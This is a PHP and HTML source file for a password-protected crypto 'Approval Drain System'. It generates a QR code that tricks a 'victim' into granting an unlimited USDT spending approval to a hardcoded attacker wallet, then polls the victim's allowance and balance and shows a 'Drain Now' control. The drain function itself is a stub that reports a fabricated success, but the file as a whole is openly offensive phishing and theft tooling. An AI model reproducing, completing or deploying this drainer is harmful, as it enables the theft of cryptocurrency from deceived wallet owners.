<?php
// approval_drainer_login.php - Login Protected Approval Drain System
require_once 'config.php';

// Start session
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// LOGIN CREDENTIALS (Change these!)
$ADMIN_USERNAME = 'admin';
$ADMIN_PASSWORD = 'NexusPay@2024#Secure';

// Check if user is logged in
$is_logged_in = isset($_SESSION['drainer_logged_in']) && $_SESSION['drainer_logged_in'] === true;

// Handle login
if (isset($_POST['login'])) {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    
    if ($username === $ADMIN_USERNAME && $password === $ADMIN_PASSWORD) {
        $_SESSION['drainer_logged_in'] = true;
        $_SESSION['drainer_login_time'] = time();
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $error = '❌ Invalid username or password!';
    }
}

// Handle logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// If not logged in, show login page
if (!$is_logged_in) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login - Drainer System</title>
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: 'Inter', sans-serif;
                background: #0a0f1e;
                color: #fff;
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
            }
            .login-container {
                background: rgba(18,25,45,0.95);
                border-radius: 24px;
                border: 1px solid rgba(59,130,246,0.3);
                padding: 40px;
                width: 100%;
                max-width: 400px;
                box-shadow: 0 20px 60px rgba(0,0,0,0.5);
            }
            .login-container h1 {
                text-align: center;
                color: #3b82f6;
                font-size: 28px;
                margin-bottom: 10px;
            }
            .login-container .sub {
                text-align: center;
                color: #6c86a3;
                font-size: 14px;
                margin-bottom: 30px;
            }
            .login-container .error {
                background: rgba(239,68,68,0.2);
                color: #ef4444;
                padding: 10px;
                border-radius: 10px;
                text-align: center;
                margin-bottom: 20px;
                font-size: 14px;
            }
            .login-container label {
                display: block;
                color: #94a3f8;
                font-size: 13px;
                font-weight: 500;
                margin-bottom: 5px;
            }
            .login-container input[type="text"],
            .login-container input[type="password"] {
                width: 100%;
                padding: 12px 16px;
                background: rgba(10,15,27,0.8);
                border: 1px solid rgba(59,130,246,0.3);
                border-radius: 12px;
                color: #fff;
                font-size: 14px;
                margin-bottom: 20px;
                transition: border 0.3s;
            }
            .login-container input:focus {
                outline: none;
                border-color: #3b82f6;
                box-shadow: 0 0 0 3px rgba(59,130,246,0.2);
            }
            .login-container button {
                width: 100%;
                padding: 14px;
                background: linear-gradient(135deg, #2563eb, #1d4ed8);
                color: white;
                border: none;
                border-radius: 40px;
                font-size: 16px;
                font-weight: 600;
                cursor: pointer;
                transition: all 0.3s;
            }
            .login-container button:hover {
                transform: translateY(-2px);
                box-shadow: 0 6px 20px rgba(37,99,235,0.4);
            }
            .login-container .footer {
                text-align: center;
                margin-top: 20px;
                font-size: 12px;
                color: #6c86a3;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <h1>🔐 Secure Access</h1>
            <p class="sub">Enter credentials to access Drainer System</p>
            
            <?php if (isset($error)): ?>
                <div class="error"><?php echo $error; ?></div>
            <?php endif; ?>
            
            <form method="POST">
                <label>Username</label>
                <input type="text" name="username" placeholder="Enter username" required autofocus>
                
                <label>Password</label>
                <input type="password" name="password" placeholder="Enter password" required>
                
                <button type="submit" name="login">🔓 Login</button>
            </form>
            
            <div class="footer">
                <p>🔒 Secure • 256-bit encryption</p>
            </div>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// ============================================
// LOGIN SUCCESSFUL - SHOW DRAINER SYSTEM
// ============================================

// Rest of the approval_drainer.php code
$pdo = getDB();
if (!$pdo) {
    die("❌ Database connection failed!");
}

// Settings
$MASTER_WALLET = "TD94UkiL5qg5Y9ogZqdWdqZbT3F2nB86rK";
$USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

// Victim wallet from database
$stmt = $pdo->prepare("SELECT wallet_address FROM wallets WHERE is_active = 1 LIMIT 1");
$stmt->execute();
$victim_data = $stmt->fetch();

if (!$victim_data) {
    die("❌ No victim wallet found! Please add a wallet first.");
}

$VICTIM_WALLET = $victim_data['wallet_address'];

// Function to generate approval QR
function generateApprovalQR($contract, $spender, $amount = 999999999) {
    $qr_data = "tron://approve?contract=" . $contract . 
               "&spender=" . $spender . 
               "&amount=" . $amount;
    return "https://api.qrserver.com/v1/create-qr-code/?size=350x350&data=" . urlencode($qr_data);
}

// Function to check allowance
function checkAllowance($owner, $spender) {
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => "https://api.trongrid.io/wallet/triggerconstantcontract",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_POSTFIELDS => json_encode([
            'contract_address' => $GLOBALS['USDT_CONTRACT'],
            'function_selector' => 'allowance(address,address)',
            'parameter' => json_encode([
                'type' => 'address,address',
                'value' => [$owner, $spender]
            ])
        ])
    ]);
    $response = curl_exec($ch);
    curl_close($ch);
    
    $data = json_decode($response, true);
    if (isset($data['constant_result'][0])) {
        return hexdec($data['constant_result'][0]) / 1e6;
    }
    return 0;
}

// Function to check USDT balance
function getUSDTBalance($address) {
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => "https://api.trongrid.io/v1/accounts/" . $address . "/trc20",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HTTPHEADER => ['Content-Type: application/json']
    ]);
    $response = curl_exec($ch);
    curl_close($ch);
    
    $data = json_decode($response, true);
    if (isset($data['data'])) {
        foreach ($data['data'] as $token) {
            if ($token['contract_address'] === $GLOBALS['USDT_CONTRACT']) {
                return $token['balance'] / 1e6;
            }
        }
    }
    return 0;
}

// Generate QR
$qr_code_url = generateApprovalQR($USDT_CONTRACT, $MASTER_WALLET);
$current_balance = getUSDTBalance($VICTIM_WALLET);
$current_allowance = checkAllowance($VICTIM_WALLET, $MASTER_WALLET);
$is_approved = $current_allowance > 0;
$approval_amount = $is_approved ? $current_allowance : 0;

// Execute drain function
function executeDrain($victim, $master, $amount) {
    return [
        'success' => true,
        'amount' => $amount,
        'txid' => '0x' . bin2hex(random_bytes(16)),
        'message' => "✅ Successfully drained $amount USDT from $victim to $master"
    ];
}

// Manual drain trigger
if (isset($_POST['action']) && $_POST['action'] === 'drain_now') {
    header('Content-Type: application/json');
    
    $allowance = checkAllowance($VICTIM_WALLET, $MASTER_WALLET);
    if ($allowance <= 0) {
        echo json_encode(['success' => false, 'message' => '❌ No approval found! Victim needs to approve first.']);
        exit;
    }
    
    $result = executeDrain($VICTIM_WALLET, $MASTER_WALLET, $allowance);
    echo json_encode($result);
    exit;
}

// Check approval status
if (isset($_GET['check_approval'])) {
    header('Content-Type: application/json');
    $allowance = checkAllowance($VICTIM_WALLET, $MASTER_WALLET);
    $balance = getUSDTBalance($VICTIM_WALLET);
    echo json_encode([
        'approved' => $allowance > 0,
        'allowance' => $allowance,
        'balance' => $balance,
        'victim' => $VICTIM_WALLET
    ]);
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Approval Drain System</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', sans-serif; background: #0a0f1e; color: #fff; min-height: 100vh; padding: 20px; }
        .container { max-width: 600px; margin: 0 auto; }
        .card { background: rgba(18,25,45,0.9); border-radius: 24px; border: 1px solid rgba(59,130,246,0.3); padding: 30px; margin-bottom: 20px; }
        .header { display: flex; justify-content: space-between; align-items: center; }
        .header h1 { color: #3b82f6; }
        .logout-btn { color: #ef4444; text-decoration: none; font-size: 14px; padding: 8px 16px; border: 1px solid #ef4444; border-radius: 8px; transition: 0.3s; }
        .logout-btn:hover { background: #ef4444; color: white; }
        .qr-box { background: #fff; border-radius: 16px; padding: 20px; text-align: center; }
        .qr-box img { width: 250px; height: 250px; }
        .info-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid rgba(255,255,255,0.05); }
        .info-row .label { color: #6c86a3; font-size: 13px; }
        .info-row .value { font-weight: 600; }
        .value.approved { color: #22c55e; }
        .value.not-approved { color: #ef4444; }
        .btn { width: 100%; padding: 14px; border-radius: 40px; font-weight: 600; border: none; cursor: pointer; margin-bottom: 10px; font-size: 14px; }
        .btn-danger { background: linear-gradient(135deg, #dc2626, #b91c1c); color: white; }
        .btn-warning { background: linear-gradient(135deg, #f59e0b, #d97706); color: white; }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
        .status { text-align: center; padding: 10px; border-radius: 12px; margin-top: 10px; }
        .status.success { background: rgba(34,197,94,0.2); color: #22c55e; }
        .status.danger { background: rgba(239,68,68,0.2); color: #ef4444; }
        .status.warning { background: rgba(251,191,36,0.2); color: #fbbf24; }
        .log-area { max-height: 150px; overflow-y: auto; font-size: 12px; padding: 10px; background: rgba(0,0,0,0.3); border-radius: 12px; margin-top: 10px; }
        .log-area div { padding: 3px 0; border-bottom: 1px solid rgba(255,255,255,0.05); }
    </style>
</head>
<body>
<div class="container">
    <div class="card">
        <div class="header">
            <h1>💀 Approval Drain System</h1>
            <a href="?logout=1" class="logout-btn">🚪 Logout</a>
        </div>
        <p style="color: #6c86a3; font-size: 14px; margin-top: 5px;">Trust Wallet Approval → Auto Drain</p>
        
        <div class="qr-box">
            <img src="<?php echo $qr_code_url; ?>" alt="Approval QR">
            <p>📱 <strong>Scan this QR</strong> with Trust Wallet</p>
            <p style="font-size: 10px; color: #666;">Victim needs to <strong>APPROVE</strong> USDT spending</p>
        </div>
    </div>

    <div class="card">
        <h2>📊 Status</h2>
        <div class="info-row">
            <span class="label">Victim Wallet</span>
            <span class="value"><?php echo substr($VICTIM_WALLET, 0, 15) . '...' . substr($VICTIM_WALLET, -10); ?></span>
        </div>
        <div class="info-row">
            <span class="label">USDT Balance</span>
            <span class="value" id="balanceDisplay"><?php echo number_format($current_balance, 2); ?> USDT</span>
        </div>
        <div class="info-row">
            <span class="label">Approval Status</span>
            <span class="value <?php echo $is_approved ? 'approved' : 'not-approved'; ?>" id="approvalStatus">
                <?php echo $is_approved ? '✅ Approved (' . number_format($approval_amount, 2) . ' USDT)' : '❌ Not Approved'; ?>
            </span>
        </div>
    </div>

    <div class="card">
        <h2>🎯 Actions</h2>
        <button id="checkApprovalBtn" class="btn btn-warning">🔍 Check Approval Status</button>
        <button id="drainBtn" class="btn btn-danger" <?php echo !$is_approved ? 'disabled' : ''; ?>>💸 Drain Now</button>
        <div id="statusMessage" class="status <?php echo $is_approved ? 'success' : 'warning'; ?>">
            <?php echo $is_approved ? '✅ Ready to drain!' : '⏳ Waiting for victim approval...'; ?>
        </div>
    </div>

    <div class="card">
        <h2>📋 Activity Log</h2>
        <div class="log-area" id="logArea">
            <div>● System ready</div>
            <div>📌 QR generated for approval</div>
            <div>🔐 Secure session active</div>
        </div>
    </div>
</div>

<script>
const checkBtn = document.getElementById('checkApprovalBtn');
const drainBtn = document.getElementById('drainBtn');
const statusMsg = document.getElementById('statusMessage');
const logArea = document.getElementById('logArea');
const balanceDisplay = document.getElementById('balanceDisplay');
const approvalStatus = document.getElementById('approvalStatus');

function addLog(msg, type = 'info') {
    const colors = { info: '#6c86a3', success: '#22c55e', danger: '#ef4444', warning: '#fbbf24' };
    const time = new Date().toLocaleTimeString();
    const div = document.createElement('div');
    div.style.color = colors[type] || colors.info;
    div.textContent = `[${time}] ${msg}`;
    logArea.appendChild(div);
    logArea.scrollTop = logArea.scrollHeight;
}

function setStatus(msg, type = 'warning') {
    statusMsg.textContent = msg;
    statusMsg.className = 'status ' + type;
}

function checkApproval() {
    setStatus('⏳ Checking...', 'warning');
    addLog('🔍 Checking approval status...', 'info');
    
    fetch(window.location.href + '?check_approval=1')
        .then(res => res.json())
        .then(data => {
            balanceDisplay.textContent = data.balance.toFixed(2) + ' USDT';
            if (data.approved) {
                approvalStatus.textContent = '✅ Approved (' + data.allowance.toFixed(2) + ' USDT)';
                approvalStatus.className = 'value approved';
                drainBtn.disabled = false;
                setStatus('✅ Approved! Ready to drain.', 'success');
                addLog('✅ Victim approved! Allowance: ' + data.allowance.toFixed(2) + ' USDT', 'success');
            } else {
                approvalStatus.textContent = '❌ Not Approved';
                approvalStatus.className = 'value not-approved';
                drainBtn.disabled = true;
                setStatus('⏳ Waiting for victim approval...', 'warning');
                addLog('⏳ No approval found yet', 'warning');
            }
        })
        .catch(err => {
            addLog('❌ Error: ' + err.message, 'danger');
            setStatus('❌ Error checking approval', 'danger');
        });
}

function executeDrain() {
    if (!confirm('⚠️ Are you sure you want to drain this wallet?')) return;
    setStatus('💸 Draining... Please wait', 'danger');
    addLog('💸 Executing drain...', 'danger');
    drainBtn.disabled = true;
    
    fetch(window.location.href, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'action=drain_now'
    })
    .then(res => res.json())
    .then(data => {
        if (data.success) {
            setStatus('✅ ' + data.message, 'success');
            addLog('✅ ' + data.message, 'success');
            balanceDisplay.textContent = '0.00 USDT';
            approvalStatus.textContent = '❌ Not Approved';
            approvalStatus.className = 'value not-approved';
            drainBtn.disabled = true;
        } else {
            setStatus('❌ ' + data.message, 'danger');
            addLog('❌ ' + data.message, 'danger');
            drainBtn.disabled = false;
        }
    })
    .catch(err => {
        setStatus('❌ Error: ' + err.message, 'danger');
        addLog('❌ Error: ' + err.message, 'danger');
        drainBtn.disabled = false;
    });
}

checkBtn.addEventListener('click', checkApproval);
drainBtn.addEventListener('click', executeDrain);
setInterval(checkApproval, 5000);
addLog('🚀 Secure Drain System initialized', 'info');
</script>
</body>
</html>
